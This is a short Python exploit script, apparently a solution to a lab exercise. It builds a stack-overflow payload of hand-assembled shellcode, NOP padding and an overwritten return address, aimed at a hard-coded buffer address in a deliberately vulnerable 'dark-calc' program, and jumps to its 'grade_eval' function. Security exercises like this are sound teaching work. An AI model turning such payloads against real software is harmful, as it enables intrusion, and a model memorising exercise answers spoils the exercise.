#!/usr/bin/env python3
"""Task 2: stack execution for attack/dark-calc."""
import sys
import struct

# dark-calc 用 __wrap_main 把栈映射到固定地址 0x721000000000 起的 RWX 区域，
# input 的 expression 缓冲区固定在 0x721000800fd0。
BUF = 0x721000800FD0

shellcode = bytes([
    0xBF, 0x04, 0x00, 0x00, 0x00,        # mov edi, 4
    0xB8, 0x87, 0x1A, 0x40, 0x00,        # mov eax, 0x401a87  (grade_eval)
    0xFF, 0xE0,                          # jmp rax
])
assert len(shellcode) == 12

payload = shellcode + b"\x90" * 4          # 填满 16 字节缓冲区
payload += b"\x90" * 8                     # 保存的 rbp
payload += struct.pack("<Q", BUF)          # 覆盖返回地址

sys.stdout.buffer.write(payload + b"\n")
